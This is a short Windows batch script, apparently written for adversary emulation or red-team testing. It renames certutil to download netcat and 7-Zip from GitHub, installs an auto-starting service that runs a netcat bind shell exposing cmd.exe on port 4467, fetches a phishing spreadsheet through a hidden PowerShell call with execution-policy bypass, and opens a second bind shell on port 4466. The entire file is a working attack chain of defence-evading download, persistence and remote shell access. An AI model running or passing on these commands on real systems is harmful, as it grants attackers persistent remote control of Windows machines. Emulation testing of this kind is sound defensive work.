@echo on

copy %windir%\system32\certutil.exe %temp%\cr.tmp

%temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/nc64.exe %Temp%\nc64.exe

%temp%\cr.tmp -urlcache -split -f https://github.com/daemondevin/7-ZipPortable/raw/master/App/7-Zip64/7z.exe %Temp%\7z.exe


sc create XSample binPath= "cmd.exe /C %Temp%\nc64.exe -nLvp 4467 -e cmd.exe" start= auto DisplayName= "XSample Service" & sc start XSample

start calc

powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm?raw=true','%Temp%\s.xlsm')"

%Temp%\nc64.exe -nLvp 4466 -e cmd.exe
